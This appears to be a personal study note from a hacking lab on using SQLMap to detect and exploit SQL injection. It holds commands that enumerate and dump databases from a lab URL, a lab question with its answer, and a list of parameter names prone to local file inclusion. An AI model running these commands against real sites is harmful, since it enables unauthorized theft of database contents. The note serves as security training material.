---
author: Alfeze
created: 2026-10-13
---

# SQLMap

> SQLMap is an automated tool for detecting and exploiting SQL injection vulnerabilities in web applications. It simplifies the process of identifying these vulnerabilities.

---



```shell
sqlmap --help
```

 The `--help` command with SQLMap will list all the available flags you can use.


```shell
sqlmap --wizard
```

If you don't want to manually add the flags to each command, use the`--wizard` flag with SQLMap. When you use this flag, the tool will guide you through each step and ask questions to complete the scan, making this a perfect option for beginners.

- The `--dbs` flag helps you to extract all the database names. 

- Once you get to know the database names, you can extract information about the tables of that database by using`-D database_name --tables`. 

- After obtaining the tables, if you want to enumerate the records in those tables, you can use`-D database_name -T table_name --dump`. 

The different flags in the SQLMap tool let you extract detailed information from the databases. 

```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```


```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```


```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```

```shell
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```


```text
What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: [http://sqlmaptesting.thm/search/cat=1](http://sqlmaptesting.thm/search/cat=1))

sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```


![[Pasted image 20261013122332.png]]



---


```shell
sqlmap -r sqli.txt --dump
```



```LFI
?file=    ?page=    ?path=    ?include=
?doc=     ?folder=  ?root=    ?pg=
?template=  ?lang=   ?view=
```
